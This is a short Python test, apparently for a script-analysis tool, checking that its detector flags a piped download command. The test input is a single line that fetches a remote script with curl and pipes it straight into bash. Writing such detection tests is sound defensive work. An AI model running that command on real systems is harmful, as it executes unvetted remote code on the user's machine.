from src.analyzer.rules import analyze_script

def test_detects_piped_curl():
    txt = "curl -s https://example.com | bash"
    results = analyze_script(txt)
    assert any("curl" in f.pattern for f in results)
